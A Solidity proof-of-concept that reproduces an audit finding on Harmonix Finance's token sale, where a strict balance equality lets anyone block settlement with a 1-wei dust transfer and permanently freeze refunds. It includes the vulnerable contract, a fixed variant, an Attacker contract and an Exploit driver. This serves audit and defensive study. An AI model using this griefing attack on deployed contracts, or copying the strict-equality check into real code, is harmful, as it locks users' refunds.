// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Harmonix Finance TokenSale finding
// 63977 (H-02): "The finalizeSettlement() can be DoS'd leading to refund
// failures".
//
// HarTokenSale.finalizeSettlement() closes settlement by asserting the LIVE
// purchaseToken balance of the contract equals the refund pool minus a fixed
// 1000-wei safety buffer, with a STRICT EQUALITY:
//
//     require(curBalance + safetyBuffer == totalRefund, "...not matched");
//
// Because `curBalance` is the contract's actual on-chain token balance, ANYONE
// can inflate it by directly transferring dust purchaseToken to the contract.
// A single wei of unsolicited inbound transfer makes the strict equality false,
// so finalizeSettlement() reverts. The attacker front-runs every finalization
// attempt this way, so settlement can NEVER be finalized. Refund claims are
// gated on `settlementFinalized`, so the entire refund pool held by the contract
// is permanently frozen. Classic forced-balance / unsolicited-transfer strict-
// equality DoS (R11).
//
// Honesty notes:
//  * finalizeSettlement() is inlined VERBATIM from the finding (marked `// @>`).
//  * purchaseToken is an opaque ERC20 boundary -> minimal faithful MiniToken.
//  * The linked repo (harmonixfi/core-contracts@979b550) is dead (404); the
//    embedded audited source is used. `_finalizeSettlement()`'s body is not
//    shown in the finding -> minimal faithful stub that flips the flag.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

/// @dev Minimal faithful double for the opaque `purchaseToken` ERC20.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: finalizeSettlement() inlined VERBATIM from the finding.
// The surrounding state vars / helpers are the minimal faithful scaffolding the
// verbatim function references (settlementFinalized, totalCommitted,
// totalAccepted, saleConfig.settleTime, purchaseToken, _finalizeSettlement).
// ─────────────────────────────────────────────────────────────────────────────
contract HarTokenSale {
    struct SaleConfig {
        uint256 settleTime;
    }

    address public owner;
    IERC20 public purchaseToken;
    bool public settlementFinalized;
    uint256 public totalCommitted;
    uint256 public totalAccepted;
    SaleConfig public saleConfig; // settleTime defaults to 0 -> settlement window open
    mapping(address => uint256) public refundOwed;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _purchaseToken) {
        owner = msg.sender;
        purchaseToken = IERC20(_purchaseToken);
    }

    // ---- minimal test scaffolding (NOT part of the audited vulnerable code) ----
    function configure(uint256 _totalCommitted, uint256 _totalAccepted) external onlyOwner {
        totalCommitted = _totalCommitted;
        totalAccepted = _totalAccepted;
    }

    function setRefundOwed(address user, uint256 amount) external onlyOwner {
        refundOwed[user] = amount;
    }

    // ---- minimal faithful stub for the un-shown internal settlement step ----
    function _finalizeSettlement() internal {
        settlementFinalized = true;
    }

    // ===== VERBATIM audited vulnerable function (HarTokenSale.sol#L186-L195) =====
    function finalizeSettlement() external onlyOwner {
        require(block.timestamp >= saleConfig.settleTime, "Settlement: too early");
        require(!settlementFinalized, "Settlement: finalized");

        _finalizeSettlement();
        uint256 curBalance = purchaseToken.balanceOf(address(this));
        uint256 safetyBuffer = 1000;
        uint256 totalRefund = totalCommitted - totalAccepted;
        require(curBalance + safetyBuffer == totalRefund, "Settlement: total refund not matched"); // @> strict equality on the LIVE token balance: any unsolicited dust transfer to the contract makes curBalance != totalRefund - safetyBuffer, so settlement reverts forever
    }
    // ============================================================================

    // Refunds are gated on finalization -> a permanent finalize DoS freezes them.
    function claimRefund() external {
        require(settlementFinalized, "Settlement: not finalized");
        uint256 amount = refundOwed[msg.sender];
        require(amount > 0, "Settlement: no refund");
        refundOwed[msg.sender] = 0;
        purchaseToken.transfer(msg.sender, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED variant (negative control): the recommended fix relaxes the strict
// equality to `>=`, so a balance inflated by unsolicited dust still finalizes.
// ─────────────────────────────────────────────────────────────────────────────
contract HarTokenSaleFixed {
    struct SaleConfig {
        uint256 settleTime;
    }

    address public owner;
    IERC20 public purchaseToken;
    bool public settlementFinalized;
    uint256 public totalCommitted;
    uint256 public totalAccepted;
    SaleConfig public saleConfig;
    mapping(address => uint256) public refundOwed;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _purchaseToken) {
        owner = msg.sender;
        purchaseToken = IERC20(_purchaseToken);
    }

    function configure(uint256 _totalCommitted, uint256 _totalAccepted) external onlyOwner {
        totalCommitted = _totalCommitted;
        totalAccepted = _totalAccepted;
    }

    function setRefundOwed(address user, uint256 amount) external onlyOwner {
        refundOwed[user] = amount;
    }

    function _finalizeSettlement() internal {
        settlementFinalized = true;
    }

    function finalizeSettlement() external onlyOwner {
        require(block.timestamp >= saleConfig.settleTime, "Settlement: too early");
        require(!settlementFinalized, "Settlement: finalized");

        _finalizeSettlement();
        uint256 curBalance = purchaseToken.balanceOf(address(this));
        uint256 safetyBuffer = 1000;
        uint256 totalRefund = totalCommitted - totalAccepted;
        // FIX: tolerate excess balance instead of requiring an exact match.
        require(curBalance + safetyBuffer >= totalRefund, "Settlement: total refund not matched");
    }

    function claimRefund() external {
        require(settlementFinalized, "Settlement: not finalized");
        uint256 amount = refundOwed[msg.sender];
        require(amount > 0, "Settlement: no refund");
        refundOwed[msg.sender] = 0;
        purchaseToken.transfer(msg.sender, amount);
    }
}

/// @dev Faithful minimal attacker: performs the unsolicited direct dust transfer.
contract Attacker {
    function grief(IERC20 token, address sale, uint256 dust) external {
        token.transfer(sale, dust); // msg.sender == this Attacker; unsolicited inbound transfer to `sale`
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: fund the sale to exactly totalRefund - safetyBuffer (so honest
// settlement would pass), then have the attacker front-run with 1 wei of dust.
// The owner's finalizeSettlement() now reverts forever; refunds gated on
// finalization are permanently frozen. The frozen pool is recorded on a MARKER
// token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant TOTAL_COMMITTED = 1_000_000 ether;
    uint256 internal constant TOTAL_ACCEPTED = 400_000 ether;
    uint256 internal constant SAFETY_BUFFER = 1000;
    uint256 internal constant USER_REFUND = 100_000 ether;
    uint256 internal constant DUST = 1;

    // Exposed results for the driver / Playground.
    bool public finalizeReverted;
    bool public settlementFinalizedAfterAttack;
    uint256 public frozenRefundPool;
    uint256 public sinkMarkerBalance;
    address public saleAddr;
    address public markerAddr;
    address public purchaseTokenAddr;

    function run() external payable {
        // --- deploy doubles + real vuln, fixed order (marker LAST) ---
        MiniToken purchaseToken = new MiniToken("Purchase", "PUR"); // nonce 1
        HarTokenSale sale = new HarTokenSale(address(purchaseToken)); // nonce 2 (Exploit = owner)
        Attacker attacker = new Attacker(); // nonce 3
        MiniToken marker = new MiniToken("Locked Refund Pool", "LOCKED-PUR"); // nonce 4 (LAST)

        saleAddr = address(sale);
        markerAddr = address(marker);
        purchaseTokenAddr = address(purchaseToken);

        // --- configure the sale: commitments + one representative refund claimant ---
        sale.configure(TOTAL_COMMITTED, TOTAL_ACCEPTED);
        sale.setRefundOwed(USER, USER_REFUND);

        // --- treasury funds the contract to EXACTLY totalRefund - safetyBuffer, so
        //     the strict equality WOULD hold under honest conditions ---
        uint256 totalRefund = TOTAL_COMMITTED - TOTAL_ACCEPTED; // 600_000e18
        uint256 funded = totalRefund - SAFETY_BUFFER; // 600_000e18 - 1000
        purchaseToken.mint(address(sale), funded);

        // ===== ATTACK: attacker front-runs finalizeSettlement with 1 wei of dust =====
        // The attacker acquires dust and directly transfers it to the sale contract
        // (the Attacker contract holds it first, so the transfer's msg.sender is the
        // attacker, i.e. an unsolicited inbound transfer the sale cannot prevent).
        purchaseToken.mint(address(attacker), DUST);
        attacker.grief(IERC20(address(purchaseToken)), address(sale), DUST);

        // --- owner (this Exploit) attempts to finalize -> strict equality now fails ---
        try sale.finalizeSettlement() {
            finalizeReverted = false;
        } catch {
            finalizeReverted = true;
        }
        settlementFinalizedAfterAttack = sale.settlementFinalized();

        // --- HARM: refunds gated on finalization can never complete; the entire
        //     refund pool held by the contract is permanently frozen ---
        frozenRefundPool = purchaseToken.balanceOf(address(sale));
        marker.mint(SINK, frozenRefundPool);
        sinkMarkerBalance = marker.balanceOf(SINK);

        require(finalizeReverted, "expected finalizeSettlement DoS");
        require(!settlementFinalizedAfterAttack, "settlement must stay unfinalized");
        require(sinkMarkerBalance == frozenRefundPool, "marker records frozen pool");
    }
}
